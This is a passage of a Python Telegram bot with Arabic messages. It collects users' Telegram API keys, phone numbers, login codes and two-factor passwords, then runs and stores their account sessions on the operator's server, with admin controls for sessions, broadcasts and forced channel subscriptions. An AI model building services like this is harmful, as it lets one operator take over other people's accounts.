        msg = await update.message.reply_text(f"{DECOR_CANCEL} البوت معطل حالياً")
        context.user_data["last_message_id"] = msg.message_id
        return ConversationHandler.END
    
    bot_token = update.message.text.strip()
    user_data_store['bot_token'] = bot_token
    
    try:
        bot = Bot(token=bot_token)
        await bot.get_me()
    except Exception as e:
        await delete_previous_message(context, user_id)
        msg = await update.message.reply_text(
            f"{DECOR_ERROR} توكن البوت غير صحيح: {str(e)}\n\n"
            f"أرسل توكن صحيح من @BotFather {DECOR_TOKEN}"
        )
        context.user_data["last_message_id"] = msg.message_id
        return BOT_TOKEN_USER
    
    return await finalize_setup(update, context)

async def finalize_setup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.callback_query:
        chat_id = update.callback_query.message.chat_id
    else:
        chat_id = update.effective_user.id
    
    try:
        client = user_data_store['client']
        bot_token = user_data_store['bot_token']
        phone = user_data_store['phone']
        
        await delete_previous_message(context, chat_id)
        msg = await context.bot.send_message(
            chat_id=chat_id,
            text=f"{DECOR_SUCCESS} جاري إنشاء المجموعة وإعداد البوت...\n\n"
                 f"⏳ قد يستغرق هذا بضع ثوان"
        )
        context.user_data["last_message_id"] = msg.message_id
        
        target_chat = await create_and_setup_group(client, bot_token)
        user_data_store['target_chat'] = target_chat
        
        save_session_data(phone, bot_token, target_chat)
        
        temp_store = {
            'client': client,
            'phone': phone,
            'bot_token': bot_token,
            'target_chat': target_chat
        }
        task = asyncio.create_task(start_userbot(client, target_chat, temp_store))
        monitor_task = asyncio.create_task(keep_alive_monitor(phone))
        
        active_userbots[phone] = {
            'client': client,
            'task': task,
            'monitor_task': monitor_task,
            'target_chat': target_chat
        }
        
        await delete_previous_message(context, chat_id)
        msg = await context.bot.send_message(
            chat_id=chat_id,
            text=f"{DECOR_SUCCESS} تم التنصيب بنجاح! ✨\n\n"
                 f"{DECOR_CHECK} تم إنشاء المجموعة\n"
                 f"{DECOR_CHECK} تم إضافة البوت\n"
                 f"{DECOR_CHECK} تم تشغيل اليوزربوت\n"
                 f"{DECOR_CHECK} تم حفظ البيانات\n\n"
                 f"معرف المجموعة: `{target_chat}`",
            parse_mode='Markdown'
        )
        context.user_data["last_message_id"] = msg.message_id
        
        return ConversationHandler.END
        
    except Exception as e:
        logging.error(f"❌ خطأ في الإعداد النهائي: {e}")
        await delete_previous_message(context, chat_id)
        msg = await context.bot.send_message(
            chat_id=chat_id,
            text=f"{DECOR_ERROR} خطأ أثناء الإعداد: {str(e)}\n\n"
                 f"حاول مرة أخرى بإرسال /start"
        )
        context.user_data["last_message_id"] = msg.message_id
        return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    admin_actions.pop(user_id, None)
    user_data_store.clear()
    
    await delete_previous_message(context, user_id)
    msg = await update.message.reply_text(f"{DECOR_CANCEL} تم الإلغاء")
    context.user_data["last_message_id"] = msg.message_id
    return ConversationHandler.END

# ==================== معالج الرسائل ====================
async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    save_user(user_id)
    
    if user_id == ADMIN_ID and user_id in admin_actions:
        action = admin_actions[user_id]
        text = update.message.text.strip() if update.message.text else ""
        
        if action == "force_add":
            if not text:
                return
            ch = text.split()[-1].strip()
            if ch.startswith("https://t.me/"):
                ch = "@" + ch.split("/")[-1]
            if not ch.startswith("@"):
                ch = "@" + ch
            
            if ch not in config["FORCE_CHANNELS"]:
                config["FORCE_CHANNELS"].append(ch)
                save_config(config)
                await update.message.reply_text(f"{DECOR_CHECK} تم إضافة {ch}")
            else:
                await update.message.reply_text(f"{DECOR_SUBSCRIPTION} {ch} موجودة بالفعل")
            del admin_actions[user_id]
            return
            
        elif action == "force_remove":
            if not text:
                return
            ch = text.split()[-1].strip()
            if ch.startswith("https://t.me/"):
                ch = "@" + ch.split("/")[-1]
            if not ch.startswith("@"):
                ch = "@" + ch
            
            if ch in config["FORCE_CHANNELS"]:
                config["FORCE_CHANNELS"].remove(ch)
                save_config(config)
                await update.message.reply_text(f"{DECOR_CHECK} تم حذف {ch}")
            else:
                await update.message.reply_text(f"{DECOR_SUBSCRIPTION} {ch} غير موجودة")
            del admin_actions[user_id]
            return
            
        elif action == "force_setimg":
            if update.message.photo:
                file = await update.message.photo[-1].get_file()
                file_path = os.path.join("data", f"subs_image_{int(datetime.now().timestamp())}.jpg")
                await file.download_to_drive(file_path)
                config["SUBSCRIPTION_IMAGE"] = file_path
                save_config(config)
                await update.message.reply_text(f"{DECOR_CHECK} تم تحديث الصورة")
                del admin_actions[user_id]
                return
            elif text:
                config["SUBSCRIPTION_IMAGE"] = text
                save_config(config)
                await update.message.reply_text(f"{DECOR_CHECK} تم تحديث رابط الصورة")
                del admin_actions[user_id]
                return
    
    if user_id == ADMIN_ID and context.user_data.get("mode") == "broadcast":
        try:
            with open(USERS_FILE, "r", encoding="utf-8") as f:
                users = json.load(f)
        except Exception:
            users = []
        
        count = 0
        for u in users:
            try:
                if update.message.photo:
                    await context.bot.send_photo(chat_id=u, photo=update.message.photo[-1].file_id, caption=update.message.caption or "")
                elif update.message.video:
                    await context.bot.send_video(chat_id=u, video=update.message.video.file_id, caption=update.message.caption or "")
                elif update.message.document:
                    await context.bot.send_document(chat_id=u, document=update.message.document.file_id, caption=update.message.caption or "")
                elif update.message.text:
                    await context.bot.send_message(chat_id=u, text=update.message.text)
                else:
                    continue
                count += 1
                await asyncio.sleep(0.1)
            except Exception as e:
                logging.warning(f"⚠️ فشل الإذاعة للمستخدم {u}: {e}")
        
        await update.message.reply_text(f"{DECOR_BROADCAST} تم الإذاعة لـ {count} مستخدم")
        context.user_data["mode"] = None
        return
    
    if not config.get("BOT_ENABLED", True) and user_id != ADMIN_ID:
        await update.message.reply_text(f"{DECOR_CANCEL} البوت معطل حالياً")
        return
    
    if not await check_force_sub(user_id, context.bot):
        await send_subscription_prompt(context.bot, user_id, context)
        return
    
    await send_welcome_message(update, context)

async def admin_button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data
    
    if user_id == ADMIN_ID:
        if data == "broadcast":
            await query.message.reply_text(f"{DECOR_BROADCAST} أرسل الرسالة للإذاعة:")
            context.user_data["mode"] = "broadcast"
            return
        elif data == "stats":
            try:
                with open(USERS_FILE, "r", encoding="utf-8") as f:
                    users = json.load(f)
            except:
                users = []
            sessions = [f for f in os.listdir(SESSIONS_DIR) if f.endswith('.session')]
            text = f"{DECOR_TITLE.format('إحصائيات')}\n\n{DECOR_STATS} المستخدمين: {len(users)}\n{DECOR_SESSIONS} الجلسات: {len(sessions)}\n{DECOR_SUCCESS} النشطة: {len(active_userbots)}"
            await query.message.reply_text(text)
            return
        elif data == "force_manage":
            keyboard = [
                [InlineKeyboardButton(f"{DECOR_SUBSCRIPTION} إضافة", callback_data="force_add")],
                [InlineKeyboardButton(f"{DECOR_SUBSCRIPTION} حذف", callback_data="force_remove")],
                [InlineKeyboardButton(f"{DECOR_SUBSCRIPTION} القائمة", callback_data="force_list")],
                [InlineKeyboardButton(f"{DECOR_IMAGE} الصورة", callback_data="force_setimg")]
            ]
            await query.message.reply_text("إدارة الاشتراك الإجباري:", reply_markup=InlineKeyboardMarkup(keyboard))
            return
        elif data == "sessions":
            sessions = [f for f in os.listdir(SESSIONS_DIR) if f.endswith('.session')]
            if not sessions:
                await query.message.reply_text(f"{DECOR_SESSIONS} لا توجد جلسات")
            else:
                text = f"{DECOR_TITLE.format('الجلسات')}\n\n"
                for i, s in enumerate(sessions, 1):
                    phone = s.replace('.session', '')
                    status = f"{DECOR_SUCCESS} نشط" if phone in active_userbots else f"{DECOR_CANCEL} متوقف"
                    text += f"{i}. {phone} - {status}\n"
                await query.message.reply_text(text)
            return
        # ✅ زر التفعيل/التعطيل يعكس الحالة ويحدث لوحة الأدمن
        elif data == "toggle_bot":
            config["BOT_ENABLED"] = not config.get("BOT_ENABLED", True)
            save_config(config)
            
            # تحديث لوحة الأدمن
            img = config.get("STARTUP_IMAGE", STARTUP_IMAGE_URL)
            bot_enabled = config["BOT_ENABLED"]
            bot_status = f"مفعّل {DECOR_SUCCESS}" if bot_enabled else f"معطل {DECOR_CANCEL}"
            caption = f"{DECOR_TITLE.format('لوحة تحكم المطور')}\n\n{DECOR_SUCCESS} حالة البوت: {bot_status}\n{DECOR_STATS} اليوزربوتات النشطة: {len(active_userbots)}"
            
            toggle_text = f"{DECOR_CANCEL} تعطيل البوت" if bot_enabled else f"{DECOR_SUCCESS} تفعيل البوت"
            
            keyboard = [
                [InlineKeyboardButton(f"{DECOR_BROADCAST} إذاعة", callback_data="broadcast")],
                [InlineKeyboardButton(f"{DECOR_STATS} إحصائيات", callback_data="stats")],
                [InlineKeyboardButton(f"{DECOR_SUBSCRIPTION} إدارة الاشتراك", callback_data="force_manage")],
                [InlineKeyboardButton(f"{DECOR_SESSIONS} الجلسات", callback_data="sessions")],
                [InlineKeyboardButton(f"{DECOR_SUCCESS} إنشاء جلسة", callback_data="create_session")],
                [InlineKeyboardButton(toggle_text, callback_data="toggle_bot")],
                [InlineKeyboardButton(f"{DECOR_DELETE} حذف جلسة", callback_data="delete_session")]
            ]
            
            await edit_admin_message(context, user_id, caption, reply_markup=InlineKeyboardMarkup(keyboard), photo=img)
            
            status_msg = f"مفعّل {DECOR_SUCCESS}" if bot_enabled else f"معطل {DECOR_CANCEL}"
            await query.answer(f"حالة البوت: {status_msg}", show_alert=True)
            return
        elif data == "delete_session":
            sessions = [f for f in os.listdir(SESSIONS_DIR) if f.endswith('.session')]
            if not sessions:
                await query.answer("لا توجد جلسات", show_alert=True)
                return
            keyboard = [[InlineKeyboardButton(f"{DECOR_DELETE} {s}", callback_data=f"del_sess|{s}")] for s in sessions]
            await query.message.reply_text("اختر جلسة للحذف:", reply_markup=InlineKeyboardMarkup(keyboard))
            return
        elif data.startswith("del_sess|"):
            session_file = data.split("|")[1]
            phone = session_file.replace('.session', '')
            try:
                if phone in active_userbots:
                    active_userbots[phone]['task'].cancel()
                    if 'monitor_task' in active_userbots[phone]:
                        active_userbots[phone]['monitor_task'].cancel()
                    await active_userbots[phone]['client'].disconnect()
                    del active_userbots[phone]
                os.remove(os.path.join(SESSIONS_DIR, session_file))
                json_file = os.path.join(SESSIONS_DIR, f"{phone}.json")
                if os.path.exists(json_file):
                    os.remove(json_file)
                await query.answer(f"{DECOR_CHECK} تم الحذف", show_alert=True)
            except Exception as e:
                await query.answer(f"{DECOR_ERROR} فشل الحذف", show_alert=True)
            return
        elif data == "force_add":
            admin_actions[user_id] = "force_add"
            await query.message.reply_text("أرسل معرف القناة:")
            return
        elif data == "force_remove":
            admin_actions[user_id] = "force_remove"
            await query.message.reply_text("أرسل معرف القناة للحذف:")
            return
        elif data == "force_list":
            channels = config.get("FORCE_CHANNELS", [])
            if not channels:
                await query.message.reply_text(f"{DECOR_SUBSCRIPTION} لا توجد قنوات")
            else:
                text = "القنوات:\n\n" + "\n".join([f"{i}. {ch}" for i, ch in enumerate(channels, 1)])
                await query.message.reply_text(text)
            return
        elif data == "force_setimg":
            admin_actions[user_id] = "force_setimg"
            await query.message.reply_text("أرسل صورة أو رابط:")
            return
        elif data.startswith("allow|"):
            await query.message.delete()
            return
        elif data.startswith("delete_session|"):
            session_file = data.split("|", 1)[1]
            phone = os.path.basename(session_file).replace('.session', '')
            try:
                if phone in active_userbots:
                    active_userbots[phone]['task'].cancel()
                    if 'monitor_task' in active_userbots[phone]:
                        active_userbots[phone]['monitor_task'].cancel()
                    await active_userbots[phone]['client'].disconnect()
                    del active_userbots[phone]
                if os.path.exists(session_file):
                    os.remove(session_file)
                json_file = os.path.join(SESSIONS_DIR, f"{phone}.json")
                if os.path.exists(json_file):
                    os.remove(json_file)
                await query.answer(f"{DECOR_CHECK} تم الحذف", show_alert=True)
                await query.message.delete()
            except Exception as e:
                await query.answer(f"{DECOR_ERROR} فشل", show_alert=True)
            return
    
    if data == "force_joincheck":
        if await check_force_sub(user_id, context.bot):
            await query.message.reply_text(f"{DECOR_CHECK} تم التحقق!")
            await send_welcome_message(query, context)
        else:
            await query.answer(f"{DECOR_SUBSCRIPTION} يجب الاشتراك أولاً!", show_alert=True)

# ==================== البرنامج الرئيسي ====================
async def main():
    logging.info("🚀 بدء تشغيل البوت...")
    
    await restart_userbots()
    
    app = ApplicationBuilder().token(MAIN_BOT_TOKEN).build()
    
    conv_handler = ConversationHandler(
        entry_points=[
            CommandHandler("start", start),
            CallbackQueryHandler(start_now_callback, pattern="^start_now$"),
            CallbackQueryHandler(create_session_callback, pattern="^create_session$"),
        ],
        states={
            API_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_api_id)],
            API_HASH: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_api_hash)],
            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
            CODE_DIGITS: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_code_digits)],
            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
            BOT_TOKEN_USER: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_bot_token)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
        allow_reentry=True
    )
    
    app.add_handler(conv_handler)
    app.add_handler(CallbackQueryHandler(admin_button_handler))
    app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, message_handler))
    
    logging.info("✅ البوت جاهز للعمل!")
    
    async with app:
        await app.initialize()
        await app.start()
        await app.updater.start_polling()
        
        stop_signal = asyncio.Event()
        try:
            await stop_signal.wait()
        except (KeyboardInterrupt, SystemExit):
            logging.info("🛑 إيقاف البوت...")
        finally:
            await app.updater.stop()
            await app.stop()
            await app.shutdown()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logging.info("✅ تم إيقاف البوت بنجاح")
    except Exception as e:
        logging.error(f"❌ خطأ فادح: {e}")